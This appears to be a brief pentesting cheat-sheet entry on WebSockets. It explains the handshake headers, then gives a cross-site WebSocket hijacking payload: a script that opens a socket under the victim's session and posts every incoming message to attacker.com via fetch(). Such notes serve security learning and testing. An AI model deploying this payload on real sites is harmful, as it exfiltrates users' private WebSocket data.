WebSocket

Several features of the WebSocket handshake messages are worth noting:

-The Connection and Upgrade headers in the request and response indicate that this is a WebSocket handshake.
-The Sec-WebSocket-Version request header specifies the WebSocket protocol version that the client wishes to use. This is typically 13.
-The Sec-WebSocket-Key request header contains a Base64-encoded random value, which should be randomly generated in each handshake request.
-The Sec-WebSocket-Accept response header contains a hash of the value submitted in the Sec-WebSocket-Key request header, concatenated with a specific string defined in the protocol specification. 
This is done to prevent misleading responses resulting from misconfigured servers or caching proxies.

----Payload

You can try all web vulnerabilities on websocket, youn can find:

-Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header. 

-CSRF payload with misconfigured(only session) websocket:

<script>
    var ws = new WebSocket('wss://your-websocket');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://attacker.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
